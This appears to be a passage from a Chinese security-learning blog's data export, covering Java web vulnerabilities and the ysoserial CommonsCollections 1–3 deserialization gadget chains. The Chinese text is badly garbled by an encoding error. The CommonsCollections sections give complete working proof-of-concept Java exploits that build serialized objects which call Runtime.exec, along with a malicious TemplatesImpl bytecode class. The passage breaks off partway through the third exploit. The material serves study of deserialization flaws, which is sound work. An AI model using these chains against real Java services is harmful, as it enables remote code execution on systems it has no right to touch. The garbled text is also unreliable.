å®‰å…¨ä»£ç  ä½¿ç”¨SimpleEvaluationContext() XStreamRceæ¼æ´ä»£ç  ä½¿ç”¨XStreamæ¥è§£æxmlï¼Œç‰ˆæœ¬1.4.10 or &lt;=1.4.6 ç›¸å…³çš„è¿˜æœ‰æ¯”å¦‚s2-052ï¼Œæ¼æ´åœ¨äºä½¿ç”¨RESTæ’ä»¶çš„XStreamç»„ä»¶è¿›è¡Œååºåˆ—åŒ–XMLæ—¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„xml payloadå¯¼è‡´RCEã€‚ æ¼æ´æµ‹è¯• å› æ­¤å½“å‰é¡¹ç›®æ›´æ–°äº†ç‰ˆæœ¬ï¼Œä¹‹åå¯ä»¥å•ç‹¬åˆ†æä¸‹XStreamæ¼æ´ å®‰å…¨ä»£ç  æ›´æ–°XStreamç‰ˆæœ¬ URLé‡å®šå‘æ¼æ´ä»£ç  ä¸Šé¢æ˜¯3ç§é‡å®šå‘çš„ä»£ç ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰å¯¹é‡å®šå‘çš„urlè¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´urlé‡å®šå‘æ¼æ´ï¼Œè·³è½¬åˆ°ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œå¯èƒ½å¯¼è‡´è·³è½¬è¿‡å»çš„ç”¨æˆ·è¢«ç²¾å¿ƒè®¾ç½®çš„é’“é±¼é¡µé¢éª—èµ°è‡ªå·±çš„ä¸ªäººä¿¡æ¯ å’Œç™»å½•å£ä»¤ ã€‚ æ¼æ´æµ‹è¯• è·³è½¬åˆ°ä»»æ„é¡µé¢ æ¼æ´ä¿®å¤ è®¾ç½®ç™½åå•å’Œé»‘åå•æ ¡éªŒ SSRFæ¼æ´ä»£ç  ç›¸å¯¹äºphpï¼Œåœ¨javaä¸­SSRFçš„åˆ©ç”¨å±€é™è¾ƒå¤§ï¼Œä¸€èˆ¬åˆ©ç”¨httpåè®®æ¥æ¢æµ‹ç«¯å£ï¼Œåˆ©ç”¨fileåè®®è¯»å–ä»»æ„æ–‡ä»¶ã€‚ æ¼æ´æµ‹è¯• è¯»æ–‡ä»¶ è¿˜å¯ä»¥ç«¯å£æ‰«æ å®‰å…¨ä»£ç  é¦–å…ˆé™åˆ¶äº†http/httpsåè®®ï¼Œä½¿ç”¨ssrfHook() è·Ÿè¿›initSocketImpl() ä¸Šé¢æ˜¯ä¸€éƒ¨åˆ†ssrfæ£€æŸ¥çš„ä»£ç ï¼Œæ€»ä½“æ˜¯ä»é»‘åå•çš„è§’åº¦æ¥é˜²æ­¢ssrfï¼Œç°åœ¨ä¸€äº›ä¸šåŠ¡ä¹Ÿå¯ä»¥é™åˆ¶åŸŸåç™½åå• 12345678910111213ä»URLä¸­è·å–hostï¼Œé™åˆ¶ä¸ºhttp&#x2F;httpsåè®®ã€‚åªæ”¯æŒhttp:&#x2F;&#x2F; å’Œ https:&#x2F;&#x2F;ï¼Œä¸æ”¯æŒ&#x2F;&#x2F;çš„httpåè®®ã€‚hostè½¬æ¢ä¸ºIP * ä¼šå°†å„ç§è¿›åˆ¶çš„ipè½¬ä¸ºæ­£å¸¸ip * 167772161è½¬æ¢ä¸º10.0.0.1 * 127.0.0.1.xip.ioè½¬æ¢ä¸º127.0.0.1ä½¿ç”¨SubnetUtilsåº“åˆ¤æ–­ipæ˜¯å¦åœ¨å†…ç½‘ç½‘æ®µ * * @param strIP ipå­—ç¬¦ä¸² * @return å¦‚æœæ˜¯å†…ç½‘ipï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚åˆ¤æ–­ä¸€ä¸ªURLçš„IPæ˜¯å¦æ˜¯å†…ç½‘IPè§£æurlçš„ipï¼Œåˆ¤æ–­ipæ˜¯å¦æ˜¯å†…ç½‘ipï¼Œæ‰€ä»¥TTLè®¾ç½®ä¸º0çš„æƒ…å†µä¸é€‚ç”¨ã€‚ * urlåªå…è®¸httpsæˆ–è€…httpï¼Œå¹¶ä¸”è®¾ç½®é»˜è®¤è¿æ¥è¶…æ—¶æ—¶é—´ã€‚ * è¯¥ä¿®å¤æ–¹æ¡ˆä¼šä¸»åŠ¨è¯·æ±‚é‡å®šå‘åçš„é“¾æ¥ã€‚æœ€å¥½ç”¨Hookæ–¹å¼è·å–åˆ°æ‰€æœ‰urlåï¼Œè¿›è¡Œåˆ¤æ–­ XXEæ¼æ´ä»£ç  è§£æxmlçš„å¯¹è±¡æ²¡æœ‰æ­£ç¡®é…ç½®å¯¼è‡´XXE å®‰å…¨ä»£ç  åé¢å‡ ä¸ªä¹Ÿå·®ä¸å¤šï¼Œæ­£ç¡®é…ç½®å¯ä»¥é˜²æ­¢XXEã€‚ æ€»ç»“è¿™ä¸ªé¡¹ç›®çœ‹çš„æ¯”è¾ƒå¿«ï¼Œä¸»è¦æ˜¯ä¸€äº›javaå¯èƒ½å‡ºç°çš„åŸºç¡€æ¼æ´ï¼Œä¸è¿‡åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­æ‰¾åˆ°ä¸€äº›å¥½æ–‡ç« ã€‚","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"ysoserial-CommonsCollectionsç³»åˆ—å­¦ä¹ ","slug":"ysoserial-CommonsCollectionsç³»åˆ—å­¦ä¹ ","date":"2020-04-14T03:06:33.000Z","updated":"2020-04-18T04:34:38.223Z","comments":true,"path":"2020/04/14/ysoserial-CommonsCollectionsç³»åˆ—å­¦ä¹ /","link":"","permalink":"https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç®€å•ä»‹ç» é¢„å¤‡çŸ¥è¯† CommonsCollections1 CommonsCollections2 CommonsCollections3 å‚è€ƒé“¾æ¥ ä¹‹å‰åˆ†æè¿‡ysoserial-CommonsCollections5è¿™æ¡é“¾ï¼Œè¿™é‡Œå­¦ä¹ ä¸‹å…¶ä»–çš„æ€è·¯ ç®€å•ä»‹ç» Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚ ä¸€äº›Javaåº”ç”¨ç¨‹åº(Weblogicï¼ŒWebsphereï¼ŒJbossï¼ŒJenkinsï¼ŒColdfusionç­‰)çš„RCEæ¼æ´éƒ½æ˜¯å› ä¸ºCommons-Collectionsçš„ååºåˆ—åŒ–é€ æˆçš„ã€‚ é¢„å¤‡çŸ¥è¯†åŠ¨æ€ä»£ç† åœ¨ä¸ä¿®æ”¹ç±»çš„æºç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä»£ç†çš„æ–¹å¼ä¸ºç±»çš„æ–¹æ³•æä¾›æ›´å¤šçš„åŠŸèƒ½ã€‚ 123456package java.lang.reflect;public interface InvocationHandler &#123; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;&#125; demo Doæ¥å£ 12345package com.company;public interface Do &#123; public String doSome();&#125; Peopleç±» 12345678package com.company;public class People implements Do&#123; public String doSome() &#123; return \"gqy\"; &#125;&#125; DoHandlerç±»ç”¨æ¥å¤„ç†è¢«ä»£ç†å¯¹è±¡ï¼Œå®ƒå¿…é¡»ç»§æ‰¿InvocationHandleræ¥å£ï¼Œå¹¶å®ç°invoke()æ–¹æ³• 123456789101112131415161718192021222324252627282930313233package com.company;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class DoHandler implements InvocationHandler &#123; private Object object; public DoHandler(Object object)&#123; this.object = object; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; //åœ¨çœŸå®çš„å¯¹è±¡æ‰§è¡Œä¹‹å‰æˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ System.out.println(\"before invokeã€‚ã€‚ã€‚\"); //javaçš„åå°„åŠŸèƒ½ï¼Œç”¨æ¥è°ƒç”¨objå¯¹è±¡çš„methodæ–¹æ³•ï¼Œä¼ å…¥å‚æ•°ä¸ºargs Object invoke = method.invoke(proxy, args); return invoke; &#125; public static void main(String[] args) &#123; People people = new People(); //ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬å°†è¦ä»£ç†çš„çœŸå®å¯¹è±¡ä¼ å…¥ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†çš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºä¼šè°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³• InvocationHandler handler = new DoHandler(people); /** * é€šè¿‡Proxyç±»çš„newProxyInstanceæ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ–¹æ³•ä¸­çš„å‚æ•° * ç¬¬ä¸€ä¸ªå‚æ•°ï¼špeople.getClass().getClassLoader()ï¼Œä½¿ç”¨handlerå¯¹è±¡çš„classloaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡ * ç¬¬äºŒä¸ªå‚æ•°ï¼špeople.getClass().getInterfaces()ï¼Œè¿™é‡Œä¸ºä»£ç†ç±»æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡å®ç°çš„æ¥å£ï¼Œè¿™æ ·ä»£ç†å¯¹è±¡å°±èƒ½åƒçœŸå®å¯¹è±¡ä¸€æ ·è°ƒç”¨æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³• * ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhandlerï¼Œæˆ‘ä»¬å°†ä»£ç†å¯¹è±¡å…³è”åˆ°ä¸Šé¢çš„InvocationHandlerå¯¹è±¡ä¸Š */ Do proxy = (Do) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler); System.out.println(proxy.doSome()); &#125;&#125; æˆåŠŸæ‰“å°å‡ºbefore invokeã€‚ã€‚ï¼Œç›¸å½“äºé‡å†™äº†doSome() javassiståŠ¨æ€ç¼–ç¨‹ ysoserialä¸­åŸºæœ¬ä¸Šæ‰€æœ‰çš„æ¶æ„objectéƒ½æ˜¯é€šè¿‡åŠ¨æ€ç¼–ç¨‹çš„æ–¹å¼ç”Ÿæˆçš„ï¼Œé€šè¿‡è¿™ç§æ–¹å¼æˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹å·²ç»å­˜åœ¨çš„javaæ–‡ä»¶å­—èŠ‚ç è¿›è¡Œæ“ä½œï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜ä¸­åŠ¨æ€ç”ŸæˆJavaä»£ç ï¼ŒåŠ¨æ€ç¼–è¯‘æ‰§è¡Œã€‚ åƒCC1å¯ä»¥ä¸ç”¨ï¼Œä½†æ˜¯åƒCC2ä½¿ç”¨javassistä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ å…³é”®å‡½æ•°åŠŸèƒ½ 123456789101112131415161718&#x2F;&#x2F;è·å–é»˜è®¤ç±»æ± ï¼Œåªæœ‰åœ¨è¿™ä¸ªClassPoolé‡Œé¢å·²ç»åŠ è½½çš„ç±»ï¼Œæ‰èƒ½ä½¿ç”¨ClassPool pool &#x3D; ClassPool.getDefault();&#x2F;&#x2F;è·å–poolä¸­çš„æŸä¸ªç±»CtClass cc &#x3D; pool.get(&quot;test.Teacher&quot;);&#x2F;&#x2F;ä¸ºccç±»è®¾ç½®çˆ¶ç±»cc.setSuperclass(pool.get(&quot;test.People&quot;));&#x2F;&#x2F;å°†åŠ¨æ€ç”Ÿæˆç±»çš„classæ–‡ä»¶å­˜å‚¨åˆ°pathè·¯å¾„ä¸‹cc.writeFile(path);&#x2F;&#x2F;è·å–ç±»çš„å­—èŠ‚ç byte[] b&#x3D;cc.toBytecode();&#x2F;&#x2F;åˆ›é€ Pointç±»CtClass cc &#x3D; pool.makeClass(&quot;Point&quot;);&#x2F;&#x2F;ä¸ºccç±»æ·»åŠ æˆå‘˜å˜é‡cc.addField(f);&#x2F;&#x2F;ä¸ºccç±»æ·»åŠ æ–¹æ³•cc.addMethod(m);&#x2F;&#x2F;ä¸ºccç±»è®¾ç½®ç±»åcc.setName(&quot;Pair&quot;); CommonsCollections1Gadget chain é€‚ç”¨ç‰ˆæœ¬ï¼š CommonsCollections3.1-3.2.1ï¼Œjdk1.8ä»¥å‰ ä¸»è¦åˆ†æLazyMap.get()ä¹‹å‰çš„ï¼Œåé¢çš„chainä¸å†èµ˜è¿°ï¼Œå¯ä»¥çœ‹ä¹‹å‰åˆ†æçš„CC5 \\java7\\jre\\lib\\rt.jar!\\sun\\reflect\\annotation\\AnnotationInvocationHandler.class readObject()æ–¹æ³• æ²¡æœ‰ç›´æ¥èƒ½è°ƒç”¨get()çš„åœ°æ–¹ï¼Œç”±äºå®ç°äº†InvocationHandleræ¥å£ï¼Œè·Ÿè¿›invoke()æ–¹æ³• è¿™é‡Œthis.memberValues.get(var4);è°ƒç”¨äº†get()æ–¹æ³• å‰é¢æ„é€ æ–¹æ³•ä¸­çœ‹åˆ°memberValuesç›´æ¥å¯æ§ï¼Œååºåˆ—åŒ–è°ƒç”¨readObject()æ–¹æ³•ï¼Œè¿™é‡Œå¯ä»¥ç»“åˆåŠ¨æ€ä»£ç†ã€‚ æˆ‘ä»¬å¯ä»¥è®¾ç½®this.memberValuesä¸ºä¸€ä¸ªLazyMapçš„ä»£ç†ç±»AnnotationInvocationHandlerï¼Œé‚£ä¹ˆæ‰§è¡Œåˆ°this.memberValues.entrySet().iterator()çš„æ—¶å€™ï¼Œå› ä¸ºthis.memberValuesä¸ºä»£ç†ç±»ï¼Œæ‰€ä»¥è½¬è€Œæ‰§è¡ŒLazyMapä»£ç†ç±»AnnotationInvocationHandlerçš„invokeæ–¹æ³• 123InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);InvocationHandler invocationHandler = (InvocationHandler)ctor.newInstance(Override.class,Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //ä¼ å…¥Runtimeç±» new ConstantTransformer(Runtime.class), //åå°„è°ƒç”¨getMethodæ–¹æ³•ï¼Œç„¶ågetMethodæ–¹æ³•å†åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œè¿”å›Runtime.getRuntime()æ–¹æ³• new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //åå°„è°ƒç”¨invokeæ–¹æ³•ï¼Œç„¶ååå°„æ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè¿”å›Runtimeå®ä¾‹åŒ–å¯¹è±¡ new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //åå°„è°ƒç”¨execæ–¹æ³• new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //å°†proxyä»£ç†æ”¾è¿›å¤–å±‚çš„AnnotationInvocationHandlerï¼Œä»è€Œmembervalues.entrysetè§¦å‘åŠ¨æ€ä»£ç† String clazzName = \"sun.reflect.annotation.AnnotationInvocationHandler\"; Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[0]; ctor.setAccessible(true); //ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬å°†è¦ä»£ç†çš„çœŸå®å¯¹è±¡ä¼ å…¥ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†çš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºä¼šè°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³• InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap); //Proxy.newProxyInstanceçš„ä¸‰ä¸ªå‚æ•° /* é€šè¿‡Proxyç±»çš„newProxyInstanceæ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ–¹æ³•ä¸­çš„å‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°ï¼špeople.getClass().getClassLoader()ï¼Œä½¿ç”¨handlerå¯¹è±¡çš„classloaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡ ç¬¬äºŒä¸ªå‚æ•°ï¼špeople.getClass().getInterfaces()ï¼Œè¿™é‡Œä¸ºä»£ç†ç±»æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡å®ç°çš„æ¥å£ï¼Œè¿™æ ·ä»£ç†å¯¹è±¡å°±èƒ½åƒçœŸå®å¯¹è±¡ä¸€æ ·è°ƒç”¨æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³• ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhandlerï¼Œæˆ‘ä»¬å°†ä»£ç†å¯¹è±¡å…³è”åˆ°ä¸Šé¢çš„InvocationHandlerå¯¹è±¡ä¸Š */ InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler)); //åºåˆ—åŒ– File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //ååºåˆ—åŒ– FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; CommonsCollections2Gadget chain é€‚ç”¨ç‰ˆæœ¬ï¼š CommonsCollections4.0ï¼Œ jdk7u21åŠä»¥å‰ã€‚ CommonsCollections1ä¹Ÿæ˜¯å¯ä»¥åœ¨commons-collections-4.0åˆ©ç”¨æˆåŠŸçš„ï¼Œ å› ä¸ºcommons-collections-4.0åˆ é™¤äº†lazyMapçš„decorate()æ–¹æ³• 123Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);&#x3D;&gt;Map lazyMap &#x3D; LazyMap.lazyMap(innerMap,transformerChain); è€ŒCommonsCollections2æ— æ³•åœ¨commons-collections-3.1-3.2.1ä¸­åˆ©ç”¨ï¼Œå› ä¸º CommonsCollections2çš„payloadä¸­ä½¿ç”¨çš„TransformingComparatoråœ¨3.1-3.2.1ç‰ˆæœ¬ä¸­è¿˜æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œæ— æ³•è¢«ååºåˆ—åŒ–ã€‚ å¯ä»¥çœ‹åˆ°CC2çš„ååºåˆ—åŒ–æ¼æ´ç‚¹ä¸»è¦è¿˜æ˜¯InvokerTransformer.transform()ï¼Œå¹¶ä¸”ç”¨åˆ°äº† /org/apache/commons/collections4/comparators/TransformingComparator.classä¸­çš„compare()æ–¹æ³• è¯¥æ–¹æ³•å®ç°äº†java.util.Comparatorä¸­å®šä¹‰çš„compare()ï¼Œ è¿™é‡Œæ‰¾åˆ°äº†PriorityQueueï¼Œå®šä¹‰äº†readObject() è·Ÿè¿›heapify() è°ƒç”¨äº†comparator.compare()æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å°†comparatorç½®ä¸ºTransformingComparator é‚£ä¹ˆå†åˆ†æInvokerTransformer.transform()ï¼Œå¯ä»¥åå°„è°ƒç”¨ç±»æ–¹æ³•ï¼Œè¿™é‡Œç”¨åˆ°äº†fastjson1.2.24ä¸­ä½¿ç”¨è¿‡çš„com.sun.org.apache.xalan.internal.xsltc.trax.Templatesï¼Œå‚è€ƒ Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24 ï¼Œ åªè¦èƒ½è°ƒç”¨åŒ…å«æ¶æ„å­—èŠ‚ç çš„TemplatesImplå¯¹è±¡çš„åˆ©ç”¨é“¾ä¸­çš„ä»»æ„å‡½æ•°(getOutputPropertiesã€newTransformerç­‰ç­‰)ï¼Œå°±èƒ½é€ æˆRCE POC ysoserialä½¿ç”¨äº†javassistç»„ä»¶è‡ªåŠ¨ç”Ÿæˆæ¶æ„ç±»çš„bytecode EvalClassç±» 123456789101112131415161718192021222324package src.com.company;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvalClass extends AbstractTranslet &#123; public EvalClass() throws IOException &#123; Runtime.getRuntime().exec(\"calc.exe\"); &#125; //ç»§æ‰¿AbstractTransletéœ€è¦é‡å†™ä¸‹é¢ä¸¤ä¸ªæ–¹æ³• public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; Pocç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package src.com.company;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.io.*;import java.lang.reflect.Field;import java.util.PriorityQueue;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class Poc &#123; public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; //1.å°è£…TemplatesImplå®ä¾‹ TemplatesImpl tmp = new TemplatesImpl(); //è·å–é»˜è®¤ç±»æ±  ClassPool pool = ClassPool.getDefault(); //åŠ å…¥æˆ‘ä»¬çš„æ¶æ„ç±» pool.insertClassPath(new ClassClassPath(EvalClass.class)); //è·å–poolä¸­çš„EvalClass CtClass pay = pool.get(EvalClass.class.getName()); //è·å–Evalç±»çš„å­—èŠ‚ç  byte[] PayCode = pay.toBytecode(); Class clazz; clazz = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); //ä¸ºç§æœ‰å±æ€§_bytecodesèµ‹å€¼ï¼Œå³æ¶æ„ç±»çš„å­—èŠ‚ç  Field tf = clazz.getDeclaredField(\"_bytecodes\"); tf.setAccessible(true); tf.set(tmp,new byte[][]&#123;PayCode&#125;); //ä¸ºç§æœ‰å±æ€§_nameèµ‹å€¼ï¼Œå†…å®¹ä»»æ„ Field name = clazz.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmp,\"gqy\"); //2.å°è£…PriorityQueueå®ä¾‹ PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); //å®ä¾‹åŒ–ä¸€ä¸ªInvokerTransformerï¼Œå› ä¸ºåªè°ƒç”¨ä¸€æ¬¡ï¼Œæ— éœ€ä½¿ç”¨transformerChain// InvokerTransformer trans = new InvokerTransformer(\"newTransformer\",new Class[0],new Object[0]); InvokerTransformer trans = new InvokerTransformer(\"getOutputProperties\",new Class[0],new Object[0]); //è°ƒç”¨è¯¥æ–¹æ³•ä¸€æ ·çš„æ•ˆæœ //å®ä¾‹åŒ–TransformingComparator TransformingComparator com = new TransformingComparator(trans); //è®¾ç½®ç§æœ‰å±æ€§comparator Field ComFi = PriorityQueue.class.getDeclaredField(\"comparator\"); ComFi.setAccessible(true); ComFi.set(queue,com); //è®¾ç½®ç§æœ‰å±æ€§queueï¼Œ//å°†templasImplå®ä¾‹æ”¾å…¥é˜Ÿåˆ—ï¼Œåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šä¼ å…¥invokertransformçš„transformå‡½æ•° Field qu = PriorityQueue.class.getDeclaredField(\"queue\"); qu.setAccessible(true); Object[] objOutput = (Object[])qu.get(queue); objOutput[0] = tmp; objOutput[1] = 1; //3.åºåˆ—åŒ– File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(queue); out.close(); //4.ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; åˆ†ææ˜¯ä¸€å›äº‹ï¼Œå†™pocæ˜¯å¦ä¸€å›äº‹ã€‚ CommonsCollections3Gadget chain é€‚ç”¨ç‰ˆæœ¬ï¼š3.1-3.2.1ï¼Œjdk7u21åŠä»¥å‰ å…¥å£å’ŒCC1ç›¸åŒï¼Œä¸åŒçš„æ˜¯åé¢æ‰¾åˆ°äº†InstantiateTransformerç±»ï¼Œ å› ä¸ºAnnotationInvocationHandler+LazyMap.get()ä¸å­˜åœ¨çš„keyå¯¼è‡´keyä¸å¯æ§ï¼Œå› æ­¤åªéœ€è¦chainedTransformerç¬¬ä¸€ä¸ªtransfomerä¸ºconstanttransformerå³å¯ï¼Œè¿™é‡Œç”¨åˆ°äº†ç±»com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter ä¼ å…¥ä¸€ä¸ªTemplateså®ä¾‹ï¼Œè°ƒç”¨äº†templates.newTransformer()ï¼Œæ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼ˆå‚è€ƒCC2ä¸­æœ€åä¸€æ­¥ï¼‰ POC 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package com.company;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.*;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;public class Poc &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException &#123; //1.å°è£…TemplatesImplå®ä¾‹ TemplatesImpl tmp = new TemplatesImpl(); //è·å–é»˜è®¤ç±»æ±  ClassPool pool = ClassPool.getDefault(); //åŠ å…¥æˆ‘ä»¬çš„æ¶æ„ç±» pool.insertClassPath(new ClassClassPath(EvalClass.class)); //è·å–poolä¸­çš„EvalClass CtClass pay = pool.get(EvalClass.class.getName()); //è·å–Evalç±»çš„å­—èŠ‚ç  byte[] PayCode = pay.toBytecode(); Class clazz; clazz = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); //ä¸ºç§æœ‰å±æ€§_bytecodesèµ‹å€¼ï¼Œå³æ¶æ„ç±»çš„å­—èŠ‚ç  Field tf = clazz.getDeclaredField(\"_bytecodes\"); tf.setAccessible(true); tf.set(tmp,new byte[][]&#123;PayCode&#125;); //ä¸ºç§æœ‰å±æ€§_nameèµ‹å€¼ï¼Œå†…å®¹ä»»æ„ Field name = clazz.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmp,\"gqy\"); //2.å°è£…chainedå’Œlazymap Transformer[] trans = new Transformer[]&#123; //ConstantTransformerä¼šå°†å‚æ•°åŸæ ·è¿”å› new ConstantTransformer(TrAXFilter.class), //ä¼ å…¥æˆ‘ä»¬çš„TemplatesImplå®ä¾‹ï¼Œä¼šåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨templates.newTransformer() new InstantiateTransformer( new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmp&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(trans); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); 